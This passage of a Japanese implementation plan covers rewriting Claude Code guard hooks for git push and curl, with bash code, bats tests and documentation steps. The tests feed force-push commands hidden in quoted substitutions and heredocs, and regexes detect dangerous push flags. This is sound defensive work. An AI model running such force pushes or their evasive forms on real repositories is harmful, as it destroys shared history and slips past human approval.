COMMAND=$(printf '%s' "$STDIN_JSON" | jq -r '.tool_input.command // empty' 2>/dev/null) || {
    case "$STDIN_JSON" in *curl*) emit_ask ;; esac
    exit 0
}
[[ -z "$COMMAND" ]] && exit 0
```

`*curl*` の早期 bail-out はそのまま残す。curlrc の検査は、`exit 0` の代わりに「curl を実行しうる token があれば ask」にしたいが、この時点ではまだ tokenize していない。そこで検査の結果を `CURLRC_PRESENT=1` として記録するだけにし、判定は末尾で行う。

reader の source が失敗したとき:

```bash
source "$(dirname "${BASH_SOURCE[0]}")/lib/shell-reader.bash" 2>/dev/null || {
    emit_ask
    exit 0
}
```

(この時点で `COMMAND` は `*curl*` に一致している。)

Task 1 で書いた末尾を、次の形に置き換える:

```bash
shell_reader_read "$COMMAND"
# 長すぎる入力は安く読めない。curl を実行するかも確かめられないので、何も返さず classifier に任せる(ADR 0009)。
[[ $SHELL_READER_TOO_LONG -eq 1 ]] && exit 0

# curl を実行しうる token があるか。引用符の中の文字列は reader が 1 token にまとめるので、
# `echo "curl …"` の `curl …` はここで一致しない。バッククォートで始まる token は実行されるので外して見る。
CURL_PRESENT=0
for token in "${SHELL_READER_TOKENS[@]}"; do
    token=${token#\`}
    if [[ "${token##*/}" == "curl" ]]; then
        CURL_PRESENT=1
        break
    fi
done
[[ $CURL_PRESENT -eq 1 ]] || exit 0

if [[ $CURLRC_PRESENT -eq 1 || $SHELL_READER_EXPANSION -eq 1 ||
    $SHELL_READER_SEP_IN_INPUT -eq 1 || $SHELL_READER_WORD_MULTIPLIER -eq 1 ]]; then
    emit_ask
    exit 0
fi

if ! shell_reader_each_segment classify_segment; then
    emit_ask
fi
exit 0
```

注意点:
- `for token in "${SHELL_READER_TOKENS[@]}"` の前で、token 数が 0 でないことを確かめる(bash 3.2 の `set -u`)。0 のときは `exit 0` とする。
- `SAW_CURL` による床は置かない(2026-10-01 のレビューで削除)。当初は「curl を実行しうる token はあるがコマンド位置に無い場合(`xargs curl`)」の念のための床として `|| [[ $SAW_CURL -ne 1 ]]` を足していたが、`xargs` / `find` は `INERT_COMMANDS` に無いので `classify_segment` が既に 1 を返して `ask` になり、床が追加で拾うのは全 segment が INERT_COMMANDS のとき(`grep -rn curl dot_claude/`、`echo curl`)だけだった。そこでは curl は実行されないので、床は誤 ask しか生まず、「全 segment が inert なら無出力」とする `dot_claude/scripts/CLAUDE.md` の記述とも矛盾していた。

- [ ] **Step 3: テストを通す**

Run: `LC_ALL=C pnpm exec bats test/curl-localhost-guard.bats && just test-scripts && just shellcheck && just shfmt`
Expected: 全件 PASS。

- [ ] **Step 4: settings.json.tmpl を更新する**

1. `"ask": [` の配列から `"Bash(curl:*)",` を削る。
2. ask のコメントで curl に触れている箇所があれば、「curl の確認は PreToolUse の curl-localhost-guard が `ask` を返して行う(ADR 0009)」に書き換える。
3. PreToolUse の curl-localhost-guard のコメント(434 行付近)を書き直す。
   - 書く内容:
     - ask ルールを置かず、フックが `ask` を返す向きであること
     - 2.1.285 ではフックの allow が ask ルールに負けるため、緩める向きが作れないこと
     - フックが死ぬと curl は classifier の判定だけになること
     - ADR 0008 / 0009 への参照
   - 消す記述:
     - 「対照ペアで実測済み(フックの allow が ask を上書き)」
     - 「フェイルクローズ」

Run: `just check-templates`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add dot_claude/scripts/executable_curl-localhost-guard.sh test/curl-localhost-guard.bats dot_claude/settings.json.tmpl
git commit -m "fix(claude): curl-localhost-guard を ask ルールに頼らず hook が ask を返す向きに反転する"
```

---

### Task 3: git-push-guard を reader に載せ替え、字面の床を足す(向きは変えない)

**Files:**
- Modify: `dot_claude/scripts/executable_git-push-guard.sh`
  - `unquote()`(85–90 行)
  - `classify_from` の中の `unquote` 呼び出しと、`case "$segment"` による `$` の検査
  - 正規化と分割(203–219 行)
  - segment のループ(219–273 行)
- Modify: `test/git-push-guard.bats`(末尾に追加。既存テストの期待値は変えない)

**Interfaces:**
- Consumes: Task 1 の reader
- Produces: 判定の契約は今と同じで、`deny` / `ask` / 無出力の 3 つ。変わるのは次の 4 点:
  - 引用符の中の区切り文字で segment を分けない(誤 deny の解消)
  - lib を読めなければ `ask` を返す
  - 8192 byte を超えるコマンドには何も返さない
  - `$` かバッククォートを含む token と、閉じていない引用符の token について、中に `git`・`push`・危険な綴りがそろっていれば `ask` を返す

- [ ] **Step 1: 回帰のテストを書き、落ちることを確かめる**

`test/git-push-guard.bats` の末尾に:

```bash
# --- shared reader: quotes are read the way bash reads them ------------------

# 2026-09-30 に、この計画を書いている最中のツール呼び出し(heredoc の中の
# "git push and a +N")が現行の guard に deny された。同じ形の誤判定。
@test "separators inside a quoted commit message are not a force push" {
    run hook 'git commit -m "fix; git push --force"'
    assert_success
    assert_output ''
}

@test "a force flag still denies inside a brace expansion" {
    run hook 'git push origin {a,b} --force'
    assert_success
    assert_equal "$(decision "$output")" deny
}

@test "a force push inside a quoted substitution asks" {
    run hook 'echo "$(git push origin main --force)"'
    assert_success
    assert_equal "$(decision "$output")" ask
}

@test "a force push swallowed by an unclosed quote asks" {
    run hook $'cat <<EOF\ndon\'t\nEOF\ngit push origin main --force'
    assert_success
    assert_equal "$(decision "$output")" ask
}

@test "a quoted substitution without a dangerous spelling produces no decision" {
    run hook 'git commit -m "$(cat <<EOF
- git push の手順を直す
EOF
)" && git push origin feature'
    assert_success
    assert_output ''
}

@test "git push and a +N on different lines of a PR body produce no decision" {
    run hook 'gh pr create --body "$(cat <<EOF
- git push の手順を直す
- +12 行、-3 行
EOF
)"'
    assert_success
    assert_output ''
}

@test "git push with --force on one line of a PR body asks" {
    run hook 'gh pr create --body "$(cat <<EOF
- 誤って git push origin main --force しないようにする
EOF
)"'
    assert_success
    assert_equal "$(decision "$output")" ask
}

@test "a missing reader library asks" {
    mkdir -p "$BATS_TEST_TMPDIR/bin"
    cp "$SCRIPT" "$BATS_TEST_TMPDIR/bin/guard.sh"
    run bash -c 'jq -n --arg c "$1" "{tool_name:\"Bash\",tool_input:{command:\$c}}" | bash "$2"' \
        _ 'git push origin feature' "$BATS_TEST_TMPDIR/bin/guard.sh"
    assert_success
    assert_equal "$(decision "$output")" ask
}

@test "an over-long command produces no decision" {
    local body
    body=$(printf 'x%.0s' $(seq 1 8200))
    run hook "gh pr create --body \"${body} git push --force\""
    assert_success
    assert_output ''
}
```

Run: `LC_ALL=C pnpm exec bats test/git-push-guard.bats`
Expected: 次の 4 件が FAIL し、他は PASS。
- `separators inside a quoted…`: 今は deny を返す
- `a force push swallowed by an unclosed quote asks`: 今は deny を返す。字面の床の上では ask になり、Claude Code 自身の deny ルール `Bash(git push --force:*)` も heredoc の後ろの行に当たる
- `a missing reader library asks`
- `an over-long command…`: 今は ask を返す

- [ ] **Step 2: reader を source する**

jq の bail-out と `*push*` の早期 bail-out の直後に:

```bash
# shellcheck source-path=SCRIPTDIR
# shellcheck source=lib/shell-reader.bash
source "$(dirname "${BASH_SOURCE[0]}")/lib/shell-reader.bash" 2>/dev/null || {
    # このフックの無出力はフェイルオープンなので、読めないときは ask に倒す。
    emit ask "$ASK_REASON"
    exit 0
}

shell_reader_read "$COMMAND"
# 長すぎる入力は安く読めない。何も返さず classifier に任せる(ADR 0009 の残存リスク)。
[[ $SHELL_READER_TOO_LONG -eq 1 ]] && exit 0
```

- [ ] **Step 3: `unquote` を `strip_backticks` にする**

reader が引用符を外すので、`unquote` の役目はバッククォートを外すことだけになる。token ごとに fork しないように、結果を global に置く形にする。`classify_from` とループの中の `x=$(unquote "…")` を、すべて `strip_backticks "…"; x=$STRIPPED` の 2 行に置き換える。

```bash
# バッククォートは reader では普通の文字なので token に残る。`` `git push … --force` `` は
# 実行されるので、前後の 1 つを外して読む。token ごとに呼ぶので $(…) で fork しない。
STRIPPED=''
strip_backticks() {
    STRIPPED=${1#\`}
    STRIPPED=${STRIPPED%\`}
}
```

`classify_from` の末尾にある `case "$segment" in *'$'* | *'`'*) NEEDS_ASK=1 ;; esac` は、segment の生の文字列ではなく token を見る形にする(同じ意味):

```bash
    local raw
    for raw in "${tokens[@]}"; do
        case "$raw" in *'$'* | *'`'*) NEEDS_ASK=1 ;; esac
    done
```

- [ ] **Step 4: 正規化・分割・ループを reader の走査に置き換える**

`NORMALIZED=` から `done <<<"$SEGMENTS"` までを削る。正規化の 3 種類(継続行、redirect の `&`、`(){}`)は reader が同じことをするので、「なぜ正規化が要ったか」のコメントは reader のテストを指す 1 行に縮める。ループ本体は callback にし、`tokens` と `count` を設定してから、今のループ本体(前置きの読み飛ばし → binary の判定 → コマンド位置を確定できない `git` の床)をそのまま実行する。

```bash
# shell_reader_each_segment の callback。常に 0 を返す(全 segment を見る)。
# classify_from は tokens / count を global として読む(bash 3.2 に nameref が無いため)。
classify_segment() {
    tokens=("$@")
    count=$#
    # (今のループ本体の `start=0` から `done`(probe のループ)までをそのまま移す。
    #  `probe=$(unquote …)` と `binary=$(unquote …)` は Step 3 の形にし、
    #  `raw=${tokens[$probe]#\`}` はそのままでよい)
    return 0
}

shell_reader_each_segment classify_segment
```

- [ ] **Step 5: 字面の床を足す**

`shell_reader_each_segment classify_segment` の直後、deny と ask の出力より前に置く:

```bash
# reader は $(…) やバッククォートの中を読まないので、引用符の中の置換に埋まった push
# (`echo "$(git push origin main --force)"`、PR 本文の heredoc)は token 1 つの文字列になる。
# 閉じていない引用符(heredoc の `don't`)も、それ以降を 1 token に飲み込む。これらの token に
# git・push・危険な綴りがそろっていれば ask にする。deny にしないのは、PR 本文の散文も同じ形になるため。
DANGER_TEXT_RE='(^|[^[:alnum:]_-])git[[:space:]].*push'
DANGER_FLAG_RE='(--force|--force-with-lease|--force-if-includes|--delete|--mirror|--prune|[[:space:]]-[[:alpha:]]*[fd][[:alpha:]]*([[:space:]]|$)|[[:space:]][+:][^[:space:]])'
# 1 行ごとに見る。heredoc の PR 本文では、別々の行にある「git push の手順」と「+12 行」を
# 組み合わせて ask にしないようにする(今のコードも改行で分割しているので同じ粒度になる)。
text_floor() {
    local line
    while IFS= read -r line || [[ -n "$line" ]]; do
        if [[ "$line" =~ $DANGER_TEXT_RE ]] && [[ "$line" =~ $DANGER_FLAG_RE ]]; then
            return 0
        fi
    done <<<"$1"
    return 1
}
if [[ -z "$DANGER_TOKEN" && ${#SHELL_READER_TOKENS[@]} -gt 0 ]]; then
    last_index=$((${#SHELL_READER_TOKENS[@]} - 1))
    for index in "${!SHELL_READER_TOKENS[@]}"; do
        token=${SHELL_READER_TOKENS[$index]}
        case "$token" in
        *'$'* | *'`'*) text_floor "$token" && NEEDS_ASK=1 ;;
        *)
            if [[ $SHELL_READER_UNCLOSED_QUOTE -eq 1 && $index -eq $last_index ]]; then
                text_floor "$token" && NEEDS_ASK=1
            fi
            ;;
        esac
    done
fi
```

注意: `text_floor "$token" && NEEDS_ASK=1` は、偽のときに非 0 を返す。しかし `case` の分岐の中で、しかも `&&` リストの一部なので、`set -e` で止まらない。`${!array[@]}` は bash 3.2 でも使える。

- [ ] **Step 6: テストを通す**

Run: `LC_ALL=C pnpm exec bats test/git-push-guard.bats && just test-scripts && just shellcheck && just shfmt`
Expected: 既存の 62 件を**期待値を変えずに**含めて、全件 PASS。既存のテストが落ちたら、テストではなく載せ替えのほうを直す。

性能:

Run: `body=$(printf 'word %.0s' $(seq 1 1600)); c="gh pr create --body \"${body:0:8000} push\""; jq -n --arg c "$c" '{tool_input:{command:$c}}' > "$TMPDIR/p.json"; /usr/bin/time -p bash dot_claude/scripts/executable_git-push-guard.sh < "$TMPDIR/p.json"`
Expected: `real` が 0.2 秒以下。

- [ ] **Step 7: Commit**

```bash
git add dot_claude/scripts/executable_git-push-guard.sh test/git-push-guard.bats
git commit -m "refactor(claude): git-push-guard を共有の shell command reader に載せ替え、引用符の中の区切りによる誤 deny を直す"
```

---

### Task 4: 記述を実態に合わせる

**Files:**
- Modify: `dot_claude/scripts/CLAUDE.md`
- Modify: `harness/modules/project/35-key-patterns.md` → `just harness-sync`
- Modify: `docs/solutions/workflow-issues/pretooluse-hook-allow-vs-permissions-ask.md`
- Modify: `docs/superpowers/specs/2026-07-25-permission-tier-model-design.md`(末尾に addendum を足す)

- [ ] **Step 1: `dot_claude/scripts/CLAUDE.md` を書き換える**

- 「git push guard hook」節:
  - 実装上の要点のうち「セグメント分割」「分割の前に正規化が要る」「トークンの引用符は1層だけ剥がす」の 3 項は、共有 reader に移ったことを 1 行で書き、`lib/shell-reader.bash` と `test/shell-reader.bats` を指す。
  - 新たに 3 点を足す: 字面の床、lib が読めないときの `ask`、8192 byte の上限。
- 「curl localhost guard hook」節:
  - 冒頭の「向きが git-push-guard と逆で…」の段落と、「フックの `allow` が `permissions.ask` を上書きできることは対照ペアで実測してある」の段落を差し替える。新しい内容は次の 3 点で、ADR 0008 / 0009 を参照する。
    - 両 hook は同じ向きである
    - 2.1.285 ではフックの allow が ask ルールに負ける
    - curl-guard は `ask` / 無出力を返す
  - 判定の段落を書き換える。旧: 「`allow` を出す条件」。新: 「無出力にする条件」と、「curl を実行しうる token」の定義。
  - トークナイザの段落(`\"`、展開、SEP、長さ)は「共有 reader の性質」として残し、curl 固有の判定(glob の印、curlrc、`--data-urlencode`)と分ける。
- 新しい節「**shell command reader**」を足す。書く内容:
  - interface
  - 判定をしない理由と、flag が立っても token を最後まで作る理由
  - `LC_ALL=C` と byte 数の上限
  - source に失敗したときに各 hook がどう受けるか(git-push は `ask`、curl は `ask`)

- [ ] **Step 2: Key Patterns モジュールを書き換えて再生成する**

`harness/modules/project/35-key-patterns.md` の 2 段落を書き換える。
- 「curl localhost guard hook」段落: 「**向きが git push guard と逆である点が要点**」から始まる説明と、「フックの `allow` が `ask` を上書きできることは対照ペアで実測済み」を、ADR 0009 の内容(両 hook が ask ルールに頼らず `deny` / `ask` / 無出力で判定する。2.1.285 で allow が ask に負けることを実測した)に置き換える。
- 「git push guard hook」段落: 共有 reader に載せたことを 1 文足す。

Run: `just harness-sync && just check-instructions`
Expected: `CLAUDE.md` と `AGENTS.md` が再生成され、drift が無い。

Run: `LC_ALL=C pnpm exec bats test/harness-instructions.bats`
Expected: PASS(`AGENTS.md` が 32 KiB に収まることと、モジュールの並び順の不変条件)。

- [ ] **Step 3: solution 文書を訂正する**

`docs/solutions/workflow-issues/pretooluse-hook-allow-vs-permissions-ask.md` の frontmatter の `last_updated` を 2026-09-30 にし、title に「(2.1.285 で覆った)」を付ける。「## 分かったこと」の直前に、次の節を足す。

```markdown
## 2026-09-30 追記: 2.1.285 では成り立たない

同じ手順(ask のみの `--settings`、sandbox 無効、`< /dev/null`)で、常に allow を返すフックが**呼ばれたうえで**
ブロックされた(フックは marker ファイルで呼ばれたことを記録)。curl と git push の両方で同じ結果だった。
フックの `deny` と `ask` は今も効く。公式ドキュメントは今も「allow なら ask は評価されない」と書いている。
この文書の「設計上の含意」(緩める向きを選べ)は、現行版では使えない。代わりの決定は
`docs/adr/0009-command-guard-hooks-gate-without-allow.md`。

**測定の落とし穴として追加:** 結果が blocked というだけでは、「フックが読み込まれていない」ことと
「フックの判定が負けた」ことを区別できない。フックに marker ファイルを書かせてから判定すること。
```

- [ ] **Step 4: spec に addendum を足す**

`docs/superpowers/specs/2026-07-25-permission-tier-model-design.md` の末尾に:

```markdown
## Addendum 2026-09-30: 共有 reader と、curl の向きの反転

- git-push-guard は、コマンド文字列の読み取りを共有の shell command reader(`dot_claude/scripts/lib/shell-reader.bash`)
  に移した。判定の向き(ask を外し、フックが deny / ask を返す)は 2026-09-16 のまま。
- 上の Residuals 表の「5 s timeout を超える長いコマンド」は、8192 byte を超えたら何も返さない形に変わった
  (classifier に任せる。長いコマンドの途中に埋まった force push を守るのは、先頭フラグ形の deny 3 行だけ)。
- 「`$(…)` containing `&&`」の行は解消した。reader は `$(…)` の中を再帰的に読まないが、引用符の中の置換に
  危険な綴りがあれば字面で ask にする。
- curl-localhost-guard も同じ向きに反転した(`Bash(curl:*)` を ask から外し、フックが ask を返す)。
  Claude Code 2.1.285 では、フックの allow が ask ルールに負けるため(`docs/adr/0008-…`、`docs/adr/0009-…`)。
```

- [ ] **Step 5: 全体を検証する**

Run: `just lint`
Expected: 全件 PASS。

Run: `ORCA_PANE_KEY=leak ORCA_AGENT_HOOK_PORT=1 ORCA_AGENT_HOOK_TOKEN=x just test-scripts`
Expected: 通常の実行と同じ結果(環境変数に左右されないこと)。

- [ ] **Step 6: Commit**

```bash
git add dot_claude/scripts/CLAUDE.md harness/modules/project/35-key-patterns.md CLAUDE.md AGENTS.md docs/solutions/workflow-issues/pretooluse-hook-allow-vs-permissions-ask.md docs/superpowers/specs/2026-07-25-permission-tier-model-design.md docs/adr/0008-command-guard-hooks-only-widen-an-approval-gate.md docs/adr/0009-command-guard-hooks-gate-without-allow.md CONTEXT.md docs/superpowers/plans/2026-09-30-shell-command-reader.md
git commit -m "docs(claude): hook の allow が ask に負ける実測と、guard hook の向きをそろえたことを記述に反映する"
```

push した後は、PR の CI(ubuntu。bash 5 と GNU coreutils)が通ったことを確かめてから、完了を報告する。
